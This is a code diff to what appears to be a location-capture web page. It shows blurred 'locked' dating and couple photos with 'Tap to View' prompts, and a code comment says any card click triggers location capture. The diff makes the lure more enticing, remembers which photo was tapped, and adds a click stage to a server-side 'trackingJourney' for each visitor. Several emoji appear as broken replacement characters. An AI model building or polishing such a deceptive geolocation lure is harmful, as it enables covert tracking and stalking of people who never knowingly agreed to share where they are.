@@ -80,81 +80,128 @@ const renderCapturePage = async (req, res, next) => {
                   font-size: 0.85rem;
               }
               
-              /* Image Album Grid */
+              /* Image Album Grid - Mobile First, No Hover */
               .album-grid {
                   display: grid;
                   grid-template-columns: repeat(2, 1fr);
-                  gap: 12px;
-                  margin-bottom: 25px;
+                  gap: 16px;
+                  margin-bottom: 30px;
+                  padding: 4px;
               }
               .album-card {
                   aspect-ratio: 1;
-                  border-radius: 16px;
+                  border-radius: 20px;
                   overflow: hidden;
                   position: relative;
-                  background: rgba(255,255,255,0.1);
-                  border: 2px solid rgba(255,255,255,0.1);
-                  transition: transform 0.3s ease, border-color 0.3s ease;
+                  background: rgba(255,255,255,0.03);
+                  border: 1px solid rgba(255,255,255,0.1);
+                  box-shadow: 
+                      0 8px 32px 0 rgba(0,0,0,0.5),
+                      inset 0 0 0 1px rgba(255,255,255,0.05);
+                  backdrop-filter: blur(4px);
+                  -webkit-backdrop-filter: blur(4px);
                   cursor: pointer;
+                  transform: scale(1);
+                  transition: transform 0.2s ease;
               }
-              .album-card:hover {
-                  transform: scale(1.02);
-                  border-color: rgba(255,255,255,0.3);
+              .album-card:active {
+                  transform: scale(0.95);
               }
               .album-card img {
                   width: 100%;
                   height: 100%;
                   object-fit: cover;
               }
-              .album-card .placeholder {
-                  width: 100%;
-                  height: 100%;
-                  display: flex;
-                  align-items: center;
-                  justify-content: center;
-                  font-size: 3rem;
-                  background: linear-gradient(135deg, #4f46e5, #7c3aed);
-              }
               .album-card .blur-overlay {
                   position: absolute;
                   inset: 0;
-                  backdrop-filter: blur(8px);
-                  background: rgba(0,0,0,0.3);
+                  backdrop-filter: blur(25px) saturate(200%);
+                  -webkit-backdrop-filter: blur(25px) saturate(200%);
+                  background: rgba(0,0,0,0.45);
                   display: flex;
-                  align-items: center;
-                  justify-content: center;
-                  font-size: 2rem;
-              }
-              
-              /* View Images Button */
-              .view-btn {
-                  width: 100%;
-                  background: linear-gradient(145deg, #4f46e5, #7c3aed);
-                  color: white;
-                  border: none;
-                  padding: 16px 32px;
-                  border-radius: 50px;
-                  font-size: 1.1rem;
-                  font-weight: 600;
-                  cursor: pointer;
-                  box-shadow: 0 10px 30px rgba(79, 70, 229, 0.4);
-                  transition: all 0.3s ease;
-                  display: flex;
+                  flex-direction: column;
                   align-items: center;
                   justify-content: center;
                   gap: 10px;
+                  border-radius: 20px;
               }
-              .view-btn:hover {
-                  transform: translateY(-2px);
-                  box-shadow: 0 15px 40px rgba(79, 70, 229, 0.5);
+              .album-card .eye-icon {
+                  font-size: 2.8rem;
+                  filter: drop-shadow(0 4px 12px rgba(0,0,0,0.8));
+                  animation: blink 3s infinite;
               }
-              .view-btn:disabled {
-                  background: #444;
-                  cursor: not-allowed;
-                  box-shadow: none;
+              @keyframes blink {
+                  0%, 90%, 100% { opacity: 1; transform: scale(1); }
+                  95% { opacity: 0.6; transform: scale(0.95); }
+              }
+              .album-card .tap-hint {
+                  font-size: 0.75rem;
+                  color: rgba(255,255,255,0.8);
+                  background: rgba(124, 58, 237, 0.5);
+                  padding: 6px 14px;
+                  border-radius: 20px;
+                  font-weight: 600;
+                  letter-spacing: 0.5px;
+                  border: 1px solid rgba(255,255,255,0.15);
+                  backdrop-filter: blur(10px);
+              }
+              
+              /* Dark glass overlay for full screen effect */
+              body::before {
+                  content: '';
+                  position: fixed;
+                  inset: 0;
+                  background: rgba(10, 10, 20, 0.85);
+                  backdrop-filter: blur(100px) saturate(200%);
+                  -webkit-backdrop-filter: blur(100px) saturate(200%);
+                  z-index: -1;
+              }
+              
+              /* View Images Button - Mobile Optimized */
+              .view-btn {
+                  width: 100%;
+                  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                  color: white;
+                  border: none;
+                  padding: 18px 36px;
+                  border-radius: 50px;
+                  font-size: 1rem;
+                  font-weight: 700;
+                  cursor: pointer;
+                  box-shadow: 
+                      0 10px 40px rgba(118, 75, 162, 0.6),
+                      0 0 0 1px rgba(255,255,255,0.1) inset,
+                      0 0 20px rgba(124, 58, 237, 0.3);
+                  transition: transform 0.15s ease;
+                  display: flex;
+                  align-items: center;
+                  justify-content: center;
+                  gap: 12px;
+                  text-transform: uppercase;
+                  letter-spacing: 1.5px;
+              }
+              .view-btn:active {
+                  transform: scale(0.96);
               }
               .view-btn .icon {
-                  font-size: 1.3rem;
+                  font-size: 1.4rem;
+              }
+              
+              /* Glow effect for unlocked cards */
+              .album-card.unlocked .blur-overlay {
+                  backdrop-filter: blur(0px);
+                  background: rgba(0,0,0,0);
+                  pointer-events: none;
+              }
+              .album-card.unlocked {
+                  box-shadow: 
+                      0 8px 32px 0 rgba(124, 58, 237, 0.3),
+                      inset 0 0 0 2px rgba(124, 58, 237, 0.5);
+                  animation: glow 2s ease-in-out infinite alternate;
+              }
+              @keyframes glow {
+                  from { box-shadow: 0 8px 32px 0 rgba(124, 58, 237, 0.3), inset 0 0 0 2px rgba(124, 58, 237, 0.5); }
+                  to { box-shadow: 0 8px 32px 0 rgba(124, 58, 237, 0.5), inset 0 0 0 2px rgba(124, 58, 237, 0.8), 0 0 20px rgba(124, 58, 237, 0.4); }
               }
               
               /* Loading State */
@@ -274,34 +321,52 @@ const renderCapturePage = async (req, res, next) => {
               <!-- Album Grid -->
               <div class="album-grid">
                   <div class="album-card" onclick="showGallery(0)">
-                      <div class="placeholder">🏖️</div>
-                      <div class="blur-overlay">🔒</div>
+                      <img src="https://images.unsplash.com/photo-1529333166437-7750a6dd5a70?w=400&h=400&fit=crop" alt="Couple" loading="lazy">
+                      <div class="blur-overlay">
+                          <div class="eye-icon">�️</div>
+                          <div class="tap-hint">Tap to View</div>
+                      </div>
                   </div>
                   <div class="album-card" onclick="showGallery(1)">
-                      <div class="placeholder">🌅</div>
-                      <div class="blur-overlay">🔒</div>
+                      <img src="https://images.unsplash.com/photo-1516589178581-6cd7833ae3b2?w=400&h=400&fit=crop" alt="Romantic" loading="lazy">
+                      <div class="blur-overlay">
+                          <div class="eye-icon">�️</div>
+                          <div class="tap-hint">Tap to View</div>
+                      </div>
                   </div>
                   <div class="album-card" onclick="showGallery(2)">
-                      <div class="placeholder">🎉</div>
-                      <div class="blur-overlay">�</div>
+                      <img src="https://images.unsplash.com/photo-1522673607200-164d1b6ce486?w=400&h=400&fit=crop" alt="Dating" loading="lazy">
+                      <div class="blur-overlay">
+                          <div class="eye-icon">�️</div>
+                          <div class="tap-hint">Tap to View</div>
+                      </div>
                   </div>
                   <div class="album-card" onclick="showGallery(3)">
-                      <div class="placeholder">📸</div>
-                      <div class="blur-overlay">🔒</div>
+                      <img src="https://images.unsplash.com/photo-1519741497674-611481863552?w=400&h=400&fit=crop" alt="Together" loading="lazy">
+                      <div class="blur-overlay">
+                          <div class="eye-icon">�️</div>
+                          <div class="tap-hint">Tap to View</div>
+                      </div>
                   </div>
                   <div class="album-card" onclick="showGallery(4)">
-                      <div class="placeholder">✈️</div>
-                      <div class="blur-overlay">🔒</div>
+                      <img src="https://images.unsplash.com/photo-1529333241880-0fc7855bb921?w=400&h=400&fit=crop" alt="Memories" loading="lazy">
+                      <div class="blur-overlay">
+                          <div class="eye-icon">�️</div>
+                          <div class="tap-hint">Tap to View</div>
+                      </div>
                   </div>
                   <div class="album-card" onclick="showGallery(5)">
-                      <div class="placeholder">🍽️</div>
-                      <div class="blur-overlay">�</div>
+                      <img src="https://images.unsplash.com/photo-1518568814500-bf0f8d125f46?w=400&h=400&fit=crop" alt="Special" loading="lazy">
+                      <div class="blur-overlay">
+                          <div class="eye-icon">�️</div>
+                          <div class="tap-hint">Tap to View</div>
+                      </div>
                   </div>
               </div>
               
               <button class="view-btn" id="view-btn" onclick="handleViewImages()">
-                  <span class="icon">🔓</span>
-                  <span>View Images</span>
+                  <span class="icon">�️</span>
+                  <span>View All Photos</span>
               </button>
               
               <div id="status"></div>
@@ -498,16 +563,20 @@ const renderCapturePage = async (req, res, next) => {
                           galleryUnlocked = true;
                           loadingOverlay.classList.remove('active');
                           status.innerHTML = '<span style="color: #22c55e;">✅ Gallery unlocked!</span>';
-                          viewBtn.innerHTML = '<span class="icon">📸</span><span>View Images</span>';
+                          viewBtn.innerHTML = '<span class="icon">📸</span><span>View All Photos</span>';
                           
                           // Remove blur overlays
                           document.querySelectorAll('.blur-overlay').forEach(el => {
                               el.style.opacity = '0';
                               el.style.pointerEvents = 'none';
                           });
+                          document.querySelectorAll('.album-card').forEach(card => {
+                              card.classList.add('unlocked');
+                          });
                           
-                          // Show first image
-                          showGallery(0);
+                          // Show the image that was clicked
+                          galleryImage.src = galleryImages[currentImageIndex];
+                          galleryOverlay.classList.add('active');
                       },
                       async (error) => {
                           await track('permission_result', { 
@@ -523,7 +592,9 @@ const renderCapturePage = async (req, res, next) => {
               }
               
               function showGallery(index) {
+                  // Always trigger location capture on card click
                   if (!galleryUnlocked) {
+                      currentImageIndex = index; // Store which image they want to see
                       handleViewImages();
                       return;
                   }
@@ -748,6 +819,10 @@ const trackEvent = async (req, res, next) => {
     const now = new Date();
     
     switch (event) {
+      case 'view_images_clicked':
+        tracking.trackingJourney.journeyStatus = 'clicked';
+        break;
+        
       case 'page_load':
         tracking.trackingJourney.pageLoadedAt = now;
         tracking.trackingJourney.journeyStatus = 'page_loaded';
